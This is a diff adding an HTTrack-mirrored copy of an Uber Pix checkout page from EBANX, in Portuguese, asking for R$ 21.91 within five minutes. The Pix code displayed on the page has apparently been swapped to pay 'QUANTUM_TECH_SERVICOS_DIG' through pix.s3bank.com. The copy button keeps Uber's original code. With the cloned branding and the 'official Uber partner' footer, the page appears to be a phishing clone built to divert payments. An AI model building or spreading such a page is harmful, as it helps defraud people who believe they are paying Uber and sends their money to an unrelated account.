@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from customer-local-latam.ebanx.com/pix/checkout?hash=67267bbd00c4d96020ab50ebe9bffc3d287e542413194763 by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Nov 2024 19:29:37 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+	<title>Página de pagamento - Uber</title>
+
+	<link rel="stylesheet" href="https://customer-local-latam.ebanx.com/styles/uber/voucher.css">
+
+	</head>
+<body>
+
+<article class="voucher">
+	<main class="voucher-content">
+			<style>
+		.dot-dot-dots {
+			width: 100%;
+			height: 0.2em;
+			background-position-y: 50%;
+			background-repeat: repeat-x;
+			background-image: url("https://customer-local-latam.ebanx.com/img/uber/dotdotdot.svg");
+		}
+	</style>
+	<div class="highlight-box">
+		<div class="highlight-box-cell">
+			<div class="highlight-box-cell-text-title">
+				Valor:
+			</div>
+			<div class="highlight-box-cell-text-valor">
+				R$ 21.91
+			</div>
+		</div>
+		<div class="highlight-box-cell last-box-cell">
+			<div class="highlight-box-cell-text-title">
+				Pague até:
+			</div>
+			<div class="highlight-box-cell-text-valor">
+				5 minutos
+			</div>
+		</div>
+	</div>
+
+	<section>
+		<div class="dot-dot-dots"></div>
+		<div class="pix-logo-full__Root">
+			<div class="pix-logo-full__PixIconWrapper">
+				<img class="pix-logo-full__PixIcon" src="https://customer-local-latam.ebanx.com/img/payments/pix.svg" alt="pix icon" />
+			</div>
+		</div>
+
+		<p class="pix-code__PixMessage">Copie o código Pix abaixo e cole em seu app de pagamento para finalizar a compra.</p>
+
+		<div class="qr-code__Code" id="code">00020126820014br.gov.bcb.pix2560pix.s3bank.com/qr/v3/at/de9d7114-9eaa-4eb9-9cdd-83ddf5c61aa45204000053039865802BR5925QUANTUM_TECH_SERVICOS_DIG6012PORTO_ALEGRE62070503***630462E9</div>
+
+		<div class="separator__Separator"></div>
+		<button title="" type="button" class="button btn copy button-copy no_print" data-clipboard-text="00020101021226740014br.gov.bcb.pix2552pix.ebanx.com/qr/v2/AF75CC2E673FECF5340FDA6C222475315204000053039865802BR5925Uber do Brasil Tecnologia6009SAO PAULO62070503***63040D17">Copiar código pix</button>
+		<div class="separator__Separator"></div>
+
+		<div class="dot-dot-dots"></div>
+	</section>
+
+	<div class="highlight-box-simple">
+		<div value="1em" class="padding__Padding">
+			<h2 class="section-title__SectionTitle">Como pagar?</h2>
+			<div class="tips-box__Tip">
+				<img src="https://customer-local-latam.ebanx.com/img/uber/tip-copy-paste.svg" alt="copy paste icon" class="tips-box__TipIcon">
+				<div class="tips-box__TipText">Cole o código Pix em seu app bancário ou carteira digital de preferência e confirme o pagamento.</div>
+			</div>
+			<div class="tips-box__Tip">
+				<img src="https://customer-local-latam.ebanx.com/img/uber/tip-smartphone-confirmation.svg" alt="phone confirmation icon" class="tips-box__TipIcon-sc-1h623wb-1 hIhprV">
+				<div class="tips-box__TipText">Seu pagamento será aprovado em alguns instantes.</div>
+			</div>
+		</div>
+	</div>
+
+	<script src="../../s3-sa-east-1.amazonaws.com/assets.ebanx.com/gateway/commons/js/clipboard.min.js"></script>
+	<script src="https://customer-local-latam.ebanx.com/js/uber/voucher.js"></script>
+	<script type="text/javascript">
+		(function () {
+			const getPaymentStatus = async function () {
+				const response = await fetch("checkout72d3.html\/\/customer-local-latam.ebanx.com\/pix\/checkout\/getPaymentStatus?hash=67267bbd00c4d96020ab50ebe9bffc3d287e542413194763");
+				if (!response.ok) {
+					return null;
+				}
+				return await response.json();
+			};
+
+			const checkPaymentStatus = async function () {
+				let result;
+				try {
+					result = await getPaymentStatus();
+				} catch (error) {
+					console.error(error);
+					result = null;
+				}
+				if (result && !result.isPending) {
+					window.location.reload();
+				} else {
+					setTimeout(checkPaymentStatus, 1000);
+				}
+			};
+			checkPaymentStatus();
+		})();
+
+	</script>
+	</main>
+
+	<footer class="page__Footer">
+		<div value="2em 1em" class="margin__FooterMargin">
+			<p>Pagamento seguro via<img src="../../cdn-email.ebanx.com/images/ebanx-new-logo-blue.png" alt="EBANX" class="page__EbanxLogo"></p>
+			<div value=".5em calc(50% - 6em)" class="padding__FooterPadding">
+				<div pattern="solid" class="separator__Line"></div>
+			</div><p>Parceiro oficial da Uber</p>
+		</div>
+	</footer>
+</article>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"8dc68845ce1f4d29","version":"2024.10.4","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"81db12904d0e4a4bb7c6ad8ad3a01cd4","b":1}' crossorigin="anonymous"></script>
